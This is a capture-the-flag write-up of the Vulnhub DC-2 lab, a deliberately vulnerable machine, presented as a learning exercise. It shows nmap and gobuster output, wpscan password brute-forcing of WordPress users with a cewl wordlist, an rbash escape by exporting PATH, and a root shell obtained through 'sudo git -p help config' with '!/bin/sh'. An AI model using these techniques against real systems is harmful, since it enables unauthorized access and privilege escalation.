---
"title": "Vulnhub - DC 2"
"date": 2019-11-15
"tags": ["wordpress", "easy", "sudo", "rbash"]
"keywords": ["wordpress", "easy", "sudo", "rbash"]
"categories": ["Vulnhub"]
"author": "Ghostbyt3"
"description": "Today, We are going to pwn DC 2 by DCAU7 from Vulnhub"
"featured_image": "/img/dc2/1.1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Vulnhub - Writeup"
---


![Untitled](/img/dc2/1.1.png)
Today, We are going to pwn DC 2 by DCAU7 from Vulnhub


## Description

>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.
As with the original DC-1, it's designed with beginners in mind.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
Just like with DC-1, there are five flags including the final flag.
And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.
In short, the only flag that really counts, is the final flag.
For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.
I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.

Download link : [https://www.vulnhub.com/entry/dc-2,311/](https://www.vulnhub.com/entry/dc-2,311/)

Lets begin with our initial nmap scan

## Nmap Scan Results

```
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu
MAC Address: 08:00:27:E2:25:6C (Oracle VirtualBox virtual NIC)
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
MAC Address: 08:00:27:E2:25:6C (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since there is HTTP port open, I gonna start my Gobuster

## Gobuster Results

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.4
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/23 12:21:05 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
/wp-content (Status: 301)
/index.php (Status: 200)
===============================================================
2019/11/23 12:21:07 Finished
===============================================================
```


Its a Wordpress site 
``Flag 1``

![Untitled](/img/dc2/1.png)

It gives us a hint that our usual wordlist wont help us in bruteforcing the password instead cewl this page.

> cewl - custom word list generator

![Untitled](/img/dc2/2.png)

I created the wordlist now

We know its a wordpress site so we can start our wpscan to enumerate users

![Untitled](/img/dc2/3-0.png)

> We have 3 users - admin,tom,jerry

## Bruteforcing the users

So lets start our bruteforce using the wordlist we created from cewl.

> wpscan --url http://dc-2/ -P pass.out -U admin
![Untitled](/img/dc2/3.png)

> wpscan --url http://dc-2/ -P pass.out -U tom
![Untitled](/img/dc2/4.png)

> wpscan --url http://dc-2/ -P pass.out -U jerry
![Untitled](/img/dc2/5.png)

## Getting Shell

I logged in with jerry
Found ``Flag 2``

![Untitled](/img/dc2/6.png)




There is no templates or plugins so i tried login with the creds in ssh which is running in the port 7744

![Untitled](/img/dc2/7.png)

I cant login with jerry but its working with ``tom:parturient``

I found flag3 but cant view them it shows some error called ``-rbash``[br/](br/) 
![Untitled](/img/dc2/8.png)

While googling i came to know it because of problem in PATH variable.
So i copied my system PATH and export them, now its working perfectly!!

![Untitled](/img/dc2/9.png)

>export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

According to ``Flag 3`` I came to know we can su , so i su to ``jerry:adipiscing``

and got ``Flag 4``

## Privilege Escalation

![Untitled](/img/dc2/10.png)

This shows we can run ``git`` without root password

>https://gtfobins.github.io/gtfobins/git/

```
sudo git -p help config
!/bin/sh
```

![Untitled](/img/dc2/11.png)
.[br/](br/)
.[br/](br/)
.[br/](br/)
![Untitled](/img/dc2/12.png)

I did according to ``GTFObins``

Got ROOT and Final Flag!!!



 